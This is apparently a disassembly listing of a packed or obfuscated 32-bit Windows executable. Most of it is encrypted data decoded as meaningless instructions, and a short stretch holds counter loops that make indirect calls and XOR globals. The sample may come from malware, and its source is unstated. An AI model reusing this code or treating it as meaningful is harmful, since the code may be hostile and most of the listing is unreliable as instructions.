  40a2a9:	and    DWORD PTR ds:0x42e78f,0x7d59
  40a2b3:	jmp    0x40a671
  40a2b8:	into   
  40a2b9:	iret   
  40a2ba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a2bb:	cmp    esp,DWORD PTR [ebp+0x7cc97171]
  40a2c1:	sbb    bl,BYTE PTR [edi+0x2b]
  40a2c4:	cwde   
  40a2c5:	xor    BYTE PTR [esi],0xd4
  40a2c8:	inc    ebp
  40a2c9:	cmc    
  40a2ca:	jo     0x40a33c
  40a2cc:	lahf   
  40a2cd:	jge    0x40a33f
  40a2cf:	jo     0x40a2b7
  40a2d1:	mov    eax,ds:0x6d79fe9
  40a2d6:	mov    bl,0x20
  40a2d8:	dec    edi
  40a2d9:	jp     0x40a2f5
  40a2db:	sub    eax,0x6466d50d
  40a2e0:	ds dec ebp
  40a2e2:	arpl   WORD PTR [ecx-0x7b1674c7],bp
  40a2e8:	loop   0x40a2ae
  40a2ea:	and    bl,BYTE PTR [ecx-0x75]
  40a2ed:	in     eax,0x8e
  40a2ef:	and    cl,bh
  40a2f1:	add    DWORD PTR [eax+0x71],esp
  40a2f4:	popf   
  40a2f5:	cld    
  40a2f6:	popf   
  40a2f7:	leave  
  40a2f8:	arpl   WORD PTR [edi-0x56],sp
  40a2fb:	iret   
  40a2fc:	jae    0x40a319
  40a2fe:	sbb    DWORD PTR [eax],ebp
  40a300:	test   DWORD PTR [esi+eax*1],esi
  40a303:	in     al,dx
  40a304:	mov    bl,0x7c
  40a306:	scas   al,BYTE PTR es:[edi]
  40a307:	out    0xc,al
  40a309:	repz cmp eax,0x6846aaed
  40a30f:	ss jmp 0x30902fb6
  40a315:	fcmovnbe st,st(0)
  40a317:	xlat   BYTE PTR ds:[ebx]
  40a318:	jle    0x40a369
  40a31a:	(bad)  
  40a31b:	cli    
  40a31c:	aas    
  40a31d:	cmp    cl,0x76
  40a320:	imul   esp,ebp,0xffffffa9
  40a323:	div    DWORD PTR [ebx+0x45227b7c]
  40a329:	ficom  WORD PTR [eax-0x319efa78]
  40a32f:	fsubp  st(1),st
  40a331:	fsqrt  
  40a333:	imul   edi,DWORD PTR ds:0xa26a5488,0xffffffc3
  40a33a:	or     BYTE PTR [esi+ebp*4-0x60],ah
  40a33e:	call   0x3a2f:0x964e08ad
  40a345:	scas   al,BYTE PTR es:[edi]
  40a346:	mov    esi,0x747ddf6e
  40a34b:	jle    0x40a35a
  40a34d:	mov    dh,0x3b
  40a34f:	pop    ss
  40a350:	sub    BYTE PTR [esi],0xac
  40a353:	fiadd  WORD PTR [eax-0x546c6d72]
  40a359:	sbb    al,0xde
  40a35b:	test   BYTE PTR [eax+0x68],cl
  40a35e:	mov    edi,0x25e90c52
  40a363:	cld    
  40a364:	add    eax,0x20963b43
  40a369:	cmp    BYTE PTR [edi-0x6f],bl
  40a36c:	xchg   edi,eax
  40a36d:	cs jmp 0x6256503d
  40a373:	call   0x1999:0xbb22323d
  40a37a:	pop    edx
  40a37b:	xor    DWORD PTR [ecx+0x71a8bec8],esp
  40a381:	aad    0x1c
  40a383:	sub    bh,BYTE PTR [ebx+0x71a29ade]
  40a389:	pop    ds
  40a38a:	sbb    BYTE PTR [esp+ebx*2-0x1bd0c3cf],al
  40a391:	and    DWORD PTR [ecx],0x8bb55a3c
  40a397:	mov    al,0xf9
  40a399:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a39a:	cmp    al,0x63
  40a39c:	jle    0x40a37f
  40a39e:	dec    ebp
  40a39f:	loopne 0x40a3a4
  40a3a1:	mov    WORD PTR [ebx-0x55],ds
  40a3a4:	repnz lahf 
  40a3a6:	sub    DWORD PTR [edx-0x35],edi
  40a3a9:	push   ds
  40a3aa:	mov    edx,eax
  40a3ac:	adc    al,0x76
  40a3af:	jbe    0x40a3e0
  40a3b1:	xchg   esp,eax
  40a3b2:	jb     0x40a433
  40a3b4:	mov    dl,BYTE PTR [eax+0x6c]
  40a3b7:	mov    dh,0xb4
  40a3b9:	repz aam 0x3e
  40a3bc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a3bd:	add    BYTE PTR [ebx+eiz*4],cl
  40a3c0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a3c1:	adc    BYTE PTR [eax+esi*8-0x538f5867],bl
  40a3c8:	retf   
  40a3c9:	lds    ebx,FWORD PTR [esi+0x6141a7f7]
  40a3cf:	dec    esi
  40a3d0:	shl    BYTE PTR [ebp-0x10],1
  40a3d3:	seto   BYTE PTR [edx+0x6002c274]
  40a3da:	ins    DWORD PTR es:[edi],dx
  40a3db:	stos   DWORD PTR es:[edi],eax
  40a3dc:	popf   
  40a3dd:	dec    ebx
  40a3de:	shl    DWORD PTR [edi-0x48],0xf5
  40a3e2:	or     al,0x27
  40a3e4:	jne    0x40a45d
  40a3e6:	(bad)
  40a3ea:	xchg   ecx,eax
  40a3eb:	adc    eax,0x5cb4b64
  40a3f0:	xor    al,0xb1
  40a3f2:	cmp    BYTE PTR [ebx-0x1a],bh
  40a3f5:	outs   dx,BYTE PTR ds:[esi]
  40a3f6:	(bad)  
  40a3f7:	aam    0xfa
  40a3f9:	aam    0x71
  40a3fb:	xchg   esi,eax
  40a3fc:	aad    0x4c
  40a3fe:	xchg   ebp,eax
  40a3ff:	sbb    BYTE PTR [eax],dh
  40a401:	test   DWORD PTR [edi+0x6613e16f],eax
  40a407:	mov    bh,0xf7
  40a409:	dec    ebx
  40a40a:	(bad)  
  40a40c:	jge    0x40a3f8
  40a40e:	or     BYTE PTR [ecx-0x50],cl
  40a411:	cli    
  40a412:	and    ecx,esi
  40a414:	outs   dx,DWORD PTR ds:[esi]
  40a415:	sbb    al,BYTE PTR [edi+0x2]
  40a418:	sahf   
  40a419:	push   edi
  40a41a:	pusha  
  40a41b:	pusha  
  40a41c:	sbb    esp,esp
  40a41e:	sbb    al,0x5c
  40a420:	mov    esi,0x7b5387bf
  40a425:	aas    
  40a426:	mov    cl,0x46
  40a428:	cmp    esi,DWORD PTR [edi-0x5d]
  40a42b:	int    0xf6
  40a42d:	mov    edi,0x4f0c85b3
  40a432:	clc    
  40a433:	(bad)  
  40a434:	xchg   eax,ecx
  40a436:	jbe    0x40a471
  40a438:	cmp    eax,ebx
  40a43a:	dec    ebx
  40a43b:	cwde   
  40a43c:	imul   esi,DWORD PTR [esi+0x79e16e5b],0xffffffae
  40a443:	sub    al,bh
  40a445:	fwait
  40a446:	pop    esi
  40a447:	or     DWORD PTR [eax-0x6b28cdcf],eax
  40a44d:	dec    ecx
  40a44e:	jnp    0x40a459
  40a450:	in     al,dx
  40a451:	push   ebp
  40a452:	jp     0x40a480
  40a454:	fisub  WORD PTR [ebx-0x19ea4a11]
  40a45a:	test   al,0xb7
  40a45c:	arpl   WORD PTR [edi+eax*4-0x177e89a0],si
  40a463:	mov    ah,0x27
  40a465:	sbb    BYTE PTR [ecx-0x26ab57aa],bl
  40a46b:	retf   
  40a46c:	mov    al,0x64
  40a46e:	cwde   
  40a46f:	loop   0x40a4a8
  40a471:	lods   al,BYTE PTR ds:[esi]
  40a472:	cmp    al,0xda
  40a474:	push   ds
  40a475:	std    
  40a476:	shr    DWORD PTR [eax+ebx*8-0x1af7190],1
  40a47d:	mov    edi,0x478cf544
  40a482:	data16 add bh,BYTE PTR [edx-0x10]
  40a486:	jp     0x40a445
  40a488:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a489:	(bad)  
  40a48b:	sbb    al,BYTE PTR [edi+0x45d37f84]
  40a491:	(bad)  
  40a492:	sbb    eax,edx
  40a494:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a495:	jp     0x40a497
  40a497:	or     al,0xdf
  40a499:	push   ecx
  40a49a:	xor    dh,BYTE PTR [ecx]
  40a49c:	mov    al,0x77
  40a49e:	dec    edx
  40a49f:	(bad)  
  40a4a1:	mov    ah,bl
  40a4a3:	mov    cs:0xdfec6290,eax
  40a4a9:	dec    esp
  40a4aa:	cmp    BYTE PTR [edi-0x58],bl
  40a4ad:	(bad)  
  40a4af:	out    0x6d,eax
  40a4b1:	sub    eax,0x6d108043
  40a4b6:	repz add al,0x70
  40a4b9:	dec    ebp
  40a4ba:	cmp    esi,ecx
  40a4bc:	into   
  40a4bd:	sbb    cl,BYTE PTR ds:0xae453ed2
  40a4c3:	addr16 leave 
  40a4c5:	loope  0x40a51d
  40a4c7:	dec    ebx
  40a4c8:	cmp    eax,0x81890ae
  40a4cd:	gs push 0x2c
  40a4d0:	adc    al,0x7b
  40a4d2:	add    DWORD PTR [ecx],edi
  40a4d4:	arpl   WORD PTR [ecx+0x10],di
  40a4d7:	fdiv   DWORD PTR [edx-0x3c62b704]
  40a4dd:	xor    BYTE PTR [edi+eiz*8+0x502d5dc5],0x52
  40a4e5:	xchg   BYTE PTR [eax-0x1],al
  40a4e8:	mov    ecx,0x135a5904
  40a4ed:	mov    ds:0x5b855b43,al
  40a4f2:	cmp    DWORD PTR [ecx+0x3a],ebx
  40a4f5:	add    edx,edi
  40a4f7:	dec    eax
  40a4f8:	fsubr  DWORD PTR [eax+0x572c03cf]
  40a4fe:	xchg   BYTE PTR [edx-0x5],bl
  40a501:	xor    BYTE PTR [edx+0x9],cl
  40a504:	sub    eax,DWORD PTR [ebp-0xe5276a4]
  40a50a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a50b:	pop    es
  40a50c:	test   BYTE PTR [ecx+edi*2+0x7b],bh
  40a510:	inc    esp
  40a511:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a512:	rcl    BYTE PTR [ebp-0x45],0x50
  40a516:	outs   dx,BYTE PTR ds:[esi]
  40a517:	jno    0x40a539
  40a519:	jmp    0x40a56b
  40a51b:	jae    0x40a552
  40a51d:	fdivr  QWORD PTR [esi]
  40a51f:	and    BYTE PTR [ebx+edx*1-0x1c],dl
  40a523:	jbe    0x40a501
  40a525:	dec    DWORD PTR [bx+si]
  40a528:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a529:	sbb    edi,esp
  40a52b:	test   BYTE PTR [esi+edx*2],0x53
  40a52f:	xchg   DWORD PTR [eax],ebx
  40a531:	call   0xa76:0xe03c9740
  40a538:	push   ebx
  40a539:	andnps xmm3,xmm2
  40a53c:	and    ecx,esi
  40a53e:	inc    edi
  40a53f:	daa    
  40a540:	sahf   
  40a541:	fwait
  40a542:	inc    ecx
  40a543:	das    
  40a544:	or     eax,0x17f937b0
  40a549:	push   edx
  40a54a:	xor    al,0xc4
  40a54c:	mov    BYTE PTR [edx+edi*2],bh
  40a54f:	dec    ebp
  40a550:	jmp    0xe197:0xea9aa7ab
  40a557:	cli    
  40a558:	sbb    ecx,ecx
  40a55a:	mov    ch,0x28
  40a55c:	add    dh,BYTE PTR [ebx+eiz*4]
  40a55f:	xor    eax,0x18572227
  40a564:	dec    esi
  40a565:	cmp    al,0xdc
  40a567:	shr    al,0x43
  40a56a:	lds    ecx,FWORD PTR [ebx]
  40a56c:	aam    0x45
  40a56e:	pushf  
  40a56f:	xor    DWORD PTR [ecx+0x5e],eax
  40a572:	cs icebp 
  40a574:	mov    esp,ds
  40a576:	push   ecx
  40a577:	push   ds
  40a578:	mov    ch,0xd8
  40a57a:	imul   ebp,DWORD PTR [esp+edi*4+0x51b9bf6d],0xb6b49e49
  40a585:	push   ecx
  40a586:	(bad)  
  40a587:	mov    ds:0x47042819,al
  40a58c:	cld    
  40a58d:	cmp    eax,0xe8a27c5b
  40a592:	out    0xa3,eax
  40a594:	out    dx,eax
  40a595:	sub    al,0x6f
  40a597:	or     BYTE PTR [ebx-0x61],0xc8
  40a59b:	xchg   ebp,eax
  40a59c:	loope  0x40a5cc
  40a59e:	mov    ecx,0xa920d8e8
  40a5a3:	ds mov dh,0xe8
  40a5a6:	scas   eax,DWORD PTR es:[edi]
  40a5a7:	jecxz  0x40a5af
  40a5a9:	push   ebx
  40a5aa:	out    0x36,al
  40a5ac:	dec    ecx
  40a5ad:	adc    ah,ah
  40a5af:	sbb    bh,BYTE PTR [edx]
  40a5b1:	leave  
  40a5b2:	leave  
  40a5b3:	sahf   
  40a5b4:	push   edi
  40a5b5:	(bad)  [edx]
  40a5b7:	cli    
  40a5b8:	fcom   DWORD PTR [edi-0x67]
  40a5bb:	push   eax
  40a5bc:	push   ecx
  40a5bd:	scas   al,BYTE PTR es:[edi]
  40a5be:	gs aam 0xa0
  40a5c1:	adc    edi,DWORD PTR [eax+0x5a]
  40a5c4:	mov    dl,0xca
  40a5c6:	jg     0x40a593
  40a5c8:	push   edx
  40a5c9:	push   0xb75f18f3
  40a5ce:	xor    BYTE PTR [edi+0x18],al
  40a5d1:	and    eax,DWORD PTR [esi-0x7c]
  40a5d4:	idiv   BYTE PTR [eax+0x53]
  40a5d7:	jne    0x40a60e
  40a5d9:	jg     0x40a5f0
  40a5db:	jne    0x40a60b
  40a5dd:	sbb    eax,0xcd658850
  40a5e2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a5e3:	loopne 0x40a5f2
  40a5e5:	adc    DWORD PTR fs:[edi+0x5f],ebp
  40a5e9:	or     edi,ebx
  40a5eb:	cmp    BYTE PTR [ebp-0x61eb5952],al
  40a5f1:	adc    DWORD PTR [ebx+edx*2-0x3c],esi
  40a5f5:	imul   BYTE PTR [ebp-0x48]
  40a5f8:	repnz and BYTE PTR [ebx],al
  40a5fb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a5fc:	stos   BYTE PTR es:[edi],al
  40a5fd:	stos   BYTE PTR es:[edi],al
  40a5fe:	inc    ecx
  40a5ff:	outs   dx,DWORD PTR ds:[esi]
  40a600:	in     eax,0x5c
  40a602:	ins    DWORD PTR es:[edi],dx
  40a603:	mov    BYTE PTR [edi-0x17],0x5b
  40a607:	mov    ah,0x9e
  40a609:	call   FWORD PTR [ecx]
  40a60b:	jge    0x40a5de
  40a60d:	retf   
  40a60e:	rcl    BYTE PTR [edi+0x5ff143a5],1
  40a614:	add    BYTE PTR [esi-0x72],dh
  40a617:	cmp    eax,0x660ca8e0
  40a61c:	push   ebp
  40a61d:	(bad)  
  40a61e:	test   DWORD PTR [eax],ebp
  40a620:	out    dx,al
  40a621:	stos   BYTE PTR es:[edi],al
  40a622:	f2xm1  
  40a624:	dec    esi
  40a625:	(bad)  
  40a626:	out    dx,al
  40a627:	ja     0x40a5fd
  40a629:	xor    DWORD PTR [ecx+0x4e],edx
  40a62c:	arpl   WORD PTR [edi],dx
  40a62e:	cmp    ebp,DWORD PTR [ecx]
  40a630:	cmp    edx,DWORD PTR [edx+0x6c]
  40a633:	popa   
  40a634:	jmp    0xa4fef0fe
  40a639:	stos   DWORD PTR es:[edi],eax
  40a63a:	or     BYTE PTR [eax-0x22],cl
  40a63d:	pop    edx
  40a63e:	(bad)  
  40a63f:	mov    bx,0xdfe2
  40a643:	sahf   
  40a644:	jo     0x40a6a3
  40a646:	sar    BYTE PTR [edx],1
  40a648:	lock stos BYTE PTR es:[edi],al
  40a64a:	adc    al,0xd1
  40a64c:	and    al,0xb0
  40a64e:	or     al,0xbf
  40a650:	mov    edx,ebp
  40a652:	dec    esi
  40a653:	cmp    edi,edi
  40a655:	mov    ds:0x4ce232ae,eax
  40a65a:	mov    es,WORD PTR [eax+0xc772f55]
  40a660:	daa    
  40a661:	mov    ch,0x56
  40a663:	mov    ds:0xac4e961,eax
  40a668:	pavgw  mm6,QWORD PTR [ecx]
  40a66b:	(bad)  
  40a66c:	je     0x40a66c
  40a66e:	mov    DWORD PTR [ebx-0x33ba386c],ebx
  40a674:	cmp    al,0x85
  40a676:	pushf  
  40a677:	clc    
  40a678:	mov    DWORD PTR [ebp-0x38],0xf89c853f
  40a67f:	and    DWORD PTR ds:0x42e76f,0x0
  40a689:	xor    edx,edx
  40a68b:	or     edx,DWORD PTR ds:0x42e76f
  40a691:	inc    edx
  40a692:	mov    DWORD PTR ds:0x42e76f,edx
  40a698:	cmp    DWORD PTR ds:0x42e76f,0xf
  40a69f:	jne    0x40a6c6
  40a6a5:	push   DWORD PTR [ebp-0x28]
  40a6a8:	push   DWORD PTR [ebp-0x10]
  40a6ab:	push   0x42e777
  40a6b0:	push   DWORD PTR [ebp-0x14]
  40a6b3:	push   DWORD PTR [ebp-0x18]
  40a6b6:	push   0x89bc
  40a6bb:	push   0x39f6
  40a6c0:	call   DWORD PTR ds:0x42e36b
  40a6c6:	cmp    DWORD PTR ds:0x42e76f,0xe
  40a6cd:	jne    0x40a6e0
  40a6d3:	mov    edx,DWORD PTR ds:0x42e76f
  40a6d9:	inc    edx
  40a6da:	mov    DWORD PTR ds:0x42e76f,edx
  40a6e0:	cmp    DWORD PTR ds:0x42e76f,0x1c
  40a6e7:	jb     0x40a689
  40a6ed:	and    DWORD PTR ds:0x42fd5d,0x0
  40a6f7:	jmp    0x40a709
  40a6fc:	mov    edx,DWORD PTR ds:0x42fd5d
  40a702:	inc    edx
  40a703:	mov    DWORD PTR ds:0x42fd5d,edx
  40a709:	cmp    DWORD PTR ds:0x42fd5d,0x13
  40a710:	jae    0x40a766
  40a716:	cmp    DWORD PTR ds:0x42fd5d,0xb
  40a71d:	jne    0x40a733
  40a723:	push   0x42e2ed
  40a728:	push   0x42e2db
  40a72d:	call   DWORD PTR ds:0x42e5c7
  40a733:	cmp    DWORD PTR ds:0x42fd5d,0xa
  40a73a:	jne    0x40a74f
  40a740:	xor    edx,edx
  40a742:	add    edx,DWORD PTR ds:0x42fd5d
  40a748:	inc    edx
  40a749:	mov    DWORD PTR ds:0x42fd5d,edx
  40a74f:	jmp    0x40a6fc
  40a754:	mov    edi,DWORD PTR ds:0x42e1b4
  40a75a:	xor    edi,DWORD PTR ds:0x42e793
  40a760:	mov    DWORD PTR ds:0x42e1b4,edi
  40a766:	mov    DWORD PTR [ebp-0x3c],0xf89c853e
  40a76d:	adc    DWORD PTR ds:0x42e793,edx
  40a773:	mov    edx,DWORD PTR [ebp+0x8]
  40a776:	xor    edx,eax
  40a778:	sub    edi,DWORD PTR ds:0x42fd51
  40a77e:	mov    edi,DWORD PTR [ebp-0x10]
  40a781:	add    edx,ecx
  40a783:	mov    DWORD PTR ds:0x42fd65,0x29c7
  40a78d:	cmp    edi,edx
  40a78f:	mov    DWORD PTR ds:0x42e793,0x10c5
  40a799:	je     0x40d88b
  40a79f:	mov    DWORD PTR ds:0x42fd79,0x41c2
  40a7a9:	push   ebx
  40a7aa:	mov    DWORD PTR ds:0x42fd89,0x2602
  40a7b4:	jmp    0x40d4a8
  40a7b9:	mov    edx,DWORD PTR [ebp-0x8]
  40a7bc:	mov    DWORD PTR ds:0x42e1b0,0x1c
  40a7c6:	cmp    DWORD PTR ds:0x42e1b0,0x0
  40a7cd:	je     0x40a824
  40a7d3:	cmp    DWORD PTR ds:0x42e1b0,0x7
  40a7da:	jne    0x40a7f8
  40a7e0:	push   DWORD PTR [ebp-0x10]
  40a7e3:	push   0x42e267
  40a7e8:	push   0x42e2bd
  40a7ed:	push   0x42e2bd
  40a7f2:	call   DWORD PTR ds:0x42e36f
  40a7f8:	cmp    DWORD PTR ds:0x42e1b0,0x8
  40a7ff:	jne    0x40a812
  40a805:	mov    edi,DWORD PTR ds:0x42e1b0
  40a80b:	dec    edi
  40a80c:	mov    DWORD PTR ds:0x42e1b0,edi
  40a812:	mov    edi,DWORD PTR ds:0x42e1b0
  40a818:	dec    edi
  40a819:	mov    DWORD PTR ds:0x42e1b0,edi
  40a81f:	jmp    0x40a7c6
  40a824:	mov    edi,DWORD PTR [ebp-0x10]
  40a827:	xor    DWORD PTR ds:0x42e1ac,0x3333
  40a831:	sub    edi,edx
  40a833:	mov    edx,DWORD PTR ds:0x42fdee
  40a839:	add    DWORD PTR ds:0x42e787,edx
  40a83f:	mov    edx,DWORD PTR [ebp-0x4]
  40a842:	jmp    0x40ac00
  40a847:	addr16 sub al,0x5e
  40a84a:	xchg   esi,eax
  40a84b:	jno    0x40a89f
  40a84d:	ja     0x40a838
  40a84f:	dec    eax
  40a850:	(bad)  
  40a851:	in     al,dx
  40a852:	std    
  40a853:	pop    edi
  40a854:	cmc    
  40a855:	pop    esi
  40a856:	jmp    0x70b19a3f
  40a85b:	lahf   
  40a85c:	jge    0x40a8ce
  40a85e:	jo     0x40a7f3
  40a860:	repz sar BYTE PTR [esi],cl
  40a863:	loopne 0x40a8c4
  40a865:	hlt    
  40a866:	inc    ebp
  40a867:	xor    al,0x68
  40a869:	dec    esp
  40a86a:	fimul  WORD PTR [edi]
  40a86c:	stc    
  40a86d:	cwde   
  40a86e:	inc    ebx
  40a86f:	sbb    DWORD PTR es:[ecx+0x6f49bbca],edx
  40a876:	ror    DWORD PTR [ebx+0x1e],0x8
  40a87a:	push   esi
  40a87b:	sub    eax,0xa2c21acb
  40a880:	div    DWORD PTR [eax-0x17a9761e]
  40a886:	scas   al,BYTE PTR es:[edi]
  40a887:	stos   BYTE PTR es:[edi],al
  40a888:	rol    BYTE PTR [ebx],1
  40a88a:	and    ch,ch
  40a88c:	push   ds
  40a88d:	pop    ebp
  40a88e:	inc    ecx
  40a88f:	jmp    0xff56:0xcd9b292b
  40a896:	stos   DWORD PTR es:[edi],eax
  40a897:	(bad)  
  40a898:	mov    ch,0xa1
  40a89a:	bound  eax,QWORD PTR [esi+eiz*2]
  40a89d:	and    DWORD PTR [eax],eax
  40a89f:	or     al,0x6a
  40a8a1:	jmp    FWORD PTR [eax-0x10c252b8]
  40a8a7:	adc    al,0xa6
  40a8a9:	popf   
  40a8aa:	mov    dl,0xf7
  40a8ac:	jo     0x40a839
  40a8ae:	jno    0x40a870
  40a8b0:	js     0x40a92e
  40a8b2:	adc    eax,0x58f85368
  40a8b7:	push   ebp
  40a8b8:	xchg   ebx,eax
  40a8b9:	push   esi
  40a8ba:	and    bh,BYTE PTR [edx+0x1e]
  40a8bd:	mov    ebx,0xc1b1c446
  40a8c2:	xor    al,0x8c
  40a8c4:	jno    0x40a86d
  40a8c6:	xchg   DWORD PTR [eax-0x27],eax
  40a8c9:	sbb    eax,DWORD PTR [edi+0x22d677f2]
  40a8cf:	stos   DWORD PTR es:[edi],eax
  40a8d0:	clc    
  40a8d1:	or     DWORD PTR [edx-0x37e01972],edi
  40a8d7:	fimul  DWORD PTR [edi-0x4e]
  40a8da:	sub    DWORD PTR [edx+0x7b453400],ecx
  40a8e0:	arpl   bx,dx
  40a8e2:	enter  0xef2,0xed
  40a8e6:	inc    ebp
  40a8e7:	adc    eax,0xbc41d84c
  40a8ec:	lahf   
  40a8ed:	leave  
  40a8ee:	outs   dx,BYTE PTR ds:[esi]
  40a8ef:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a8f0:	xor    esp,DWORD PTR [edi]
  40a8f2:	and    DWORD PTR [edx-0x2838d305],ecx
  40a8f8:	js     0x40a93f
  40a8fa:	or     bl,BYTE PTR [ecx]
  40a8fc:	push   es
  40a8fd:	xchg   BYTE PTR [esi-0x35b701cd],ah
  40a903:	inc    edi
  40a904:	cdq    
  40a905:	dec    edx
  40a906:	test   al,0xa2
  40a908:	dec    ebp
  40a909:	cwde   
  40a90a:	sbb    eax,0x3091d401
  40a90f:	loop   0x40a8de
  40a911:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a912:	push   ds
  40a913:	in     eax,dx
  40a914:	sub    BYTE PTR [eax],dh
  40a916:	xchg   esp,eax
  40a917:	cmp    DWORD PTR [edi],esi
  40a919:	aad    0x34
  40a91b:	ja     0x40a929
  40a91d:	pop    es
  40a91e:	mov    bl,0xd5
  40a920:	sti    
  40a921:	and    dx,WORD PTR [esp+esi*1+0x68]
  40a926:	lods   eax,DWORD PTR ds:[esi]
  40a927:	mov    BYTE PTR [edi+0x58004062],dl
  40a92d:	jne    0x40a999
  40a92f:	das    
  40a930:	mov    ax,0x8847
  40a934:	jae    0x40a98d
  40a936:	xchg   esp,eax
  40a937:	jg     0x40a8f7
  40a939:	sbb    BYTE PTR [esi*4+0x788c82e3],cl
  40a940:	and    edx,edi
  40a942:	sub    BYTE PTR [edi],dh
  40a944:	adc    edx,DWORD PTR [edi-0x47]
  40a947:	xchg   ebx,eax
  40a948:	sub    DWORD PTR [eax+eax*2+0x6067cdf8],esp
  40a94f:	sbb    al,0x6a
  40a951:	and    eax,0x36012e8f
  40a956:	(bad)  
  40a957:	inc    esi
  40a958:	xor    ebx,edi
  40a95a:	std    
  40a95b:	ss adc eax,0xe54042fe
  40a961:	and    ecx,DWORD PTR [eax+eiz*4+0x6f]
  40a965:	mov    ch,0x5c
  40a967:	daa    
  40a968:	repz hlt 
  40a96a:	add    cl,bh
  40a96c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a96d:	call   FWORD PTR [esi]
  40a96f:	fistp  QWORD PTR [edi+0x16e86da9]
  40a975:	inc    ecx
  40a976:	sbb    bl,BYTE PTR [eax+0x6c]
  40a979:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a97a:	push   cs
  40a97b:	push   esi
  40a97c:	add    al,0x37
  40a97e:	test   eax,0xf3316854
  40a983:	sar    BYTE PTR [esp+ecx*1+0x6ef15956],cl
  40a98a:	cmp    DWORD PTR [ebx-0x6d],eax
  40a98d:	xchg   ecx,ecx
  40a98f:	jmp    FWORD PTR [esi-0x45]
  40a992:	mov    ebp,DWORD PTR [edi+0x1e210076]
  40a998:	sub    DWORD PTR [edx+0x14531802],0x61
  40a99f:	fcom   QWORD PTR [ecx]
  40a9a1:	xchg   edx,eax
  40a9a2:	jg     0x40a93e
  40a9a4:	icebp  
  40a9a5:	std    
  40a9a6:	mov    BYTE PTR [edx+0x313cab04],al
  40a9ac:	xlat   BYTE PTR ds:[ebx]
  40a9ad:	jae    0x40a94d
  40a9af:	sub    ah,BYTE PTR [esi-0x4e]
  40a9b2:	xchg   esi,eax
  40a9b3:	fcmovnu st,st(6)
  40a9b5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a9b6:	dec    esi
  40a9b7:	cs dec ecx
  40a9b9:	push   ebx
  40a9ba:	rcr    DWORD PTR [ebx+ebp*2],1
  40a9bd:	xchg   ecx,eax
  40a9be:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a9bf:	jmp    0xb4bab6d2
  40a9c4:	mov    edi,0xc4d4737b
  40a9c9:	inc    edx
  40a9ca:	xchg   edx,eax
  40a9cb:	aam    0x3
  40a9cd:	sbb    BYTE PTR [eax],dl
  40a9cf:	sbb    eax,0xc41bd280
  40a9d4:	push   esp
  40a9d5:	add    BYTE PTR [ecx-0xe23fd4f],al
  40a9db:	adc    DWORD PTR ds:0xcabc0c0f,0x42
  40a9e2:	dec    esp
  40a9e3:	test   eax,0x6700fa69
  40a9e8:	push   esp
  40a9e9:	sbb    eax,ebx
  40a9eb:	mov    dl,0x4f
  40a9ed:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a9ee:	jmp    0x3e624bb5
  40a9f3:	sub    eax,0x2e88f6ab
  40a9f8:	popa   
  40a9f9:	mov    dl,bh
  40a9fb:	fld    st(7)
  40a9fd:	xor    eax,DWORD PTR [esi-0x611eb2eb]
  40aa03:	adc    eax,0x7368f626
  40aa08:	pop    gs
  40aa0a:	dec    BYTE PTR [ebp-0x69220fe2]
  40aa10:	push   esp
  40aa11:	repz xor al,0x22
  40aa14:	pop    edx
  40aa15:	sub    cl,BYTE PTR [ebx]
  40aa17:	push   ss
  40aa18:	or     bl,BYTE PTR [ecx]
  40aa1a:	dec    esi
  40aa1b:	fwait
  40aa1c:	push   ss
  40aa1d:	cli    
  40aa1e:	inc    esi
  40aa1f:	sub    ah,BYTE PTR [eax]
  40aa21:	push   edi
  40aa22:	dec    ebx
  40aa23:	mov    ebp,DWORD PTR [ecx-0x881834b]
  40aa29:	or     cl,BYTE PTR [edx-0x5dd60348]
  40aa2f:	(bad)  
  40aa30:	pop    ebp
  40aa31:	in     eax,0xe4
  40aa33:	pop    ecx
  40aa34:	pop    eax
  40aa35:	clc    
  40aa36:	dec    eax
  40aa37:	dec    edi
  40aa38:	xchg   edi,eax
  40aa39:	(bad)  
  40aa3b:	ins    DWORD PTR es:[edi],dx
  40aa3c:	push   0x3c85bdfa
  40aa41:	sar    BYTE PTR [ecx],0x60
  40aa44:	jae    0x40aa3a
  40aa46:	push   0x579df082
  40aa4b:	add    ecx,DWORD PTR [eax]
  40aa4d:	fstp   DWORD PTR [edi+0x2d4ea37d]
  40aa53:	mov    ah,0xa2
  40aa55:	fstp   TBYTE PTR [eax-0x407374ad]
  40aa5b:	scas   al,BYTE PTR es:[edi]
  40aa5c:	mov    ds:0x43b5987e,eax
  40aa61:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40aa62:	lock push edx
  40aa64:	stc    
  40aa65:	arpl   WORD PTR [esi+esi*4-0x4a],cx
  40aa69:	push   cs
  40aa6a:	mov    bl,0x1a
  40aa6c:	xor    ebx,DWORD PTR [edi]
  40aa6e:	pop    ss
  40aa6f:	rcl    ecx,1
  40aa71:	jbe    0x40aa8c
  40aa73:	addr16 in eax,0x30
  40aa76:	cmp    eax,0xb4b33e9e
  40aa7b:	mov    ds:0x54c3d595,eax
  40aa80:	retf   
  40aa81:	sub    eax,0xdb7e141
  40aa86:	xor    ebx,DWORD PTR [ebx]
  40aa88:	ja     0x40ab03
  40aa8a:	adc    edi,DWORD PTR es:[esi+0x5b]
  40aa8e:	not    DWORD PTR ds:0x659c2f44
  40aa94:	dec    ebx
  40aa95:	fs into 
  40aa97:	mov    ch,0x5f
  40aa99:	jmp    0x45da:0x2642ec5c
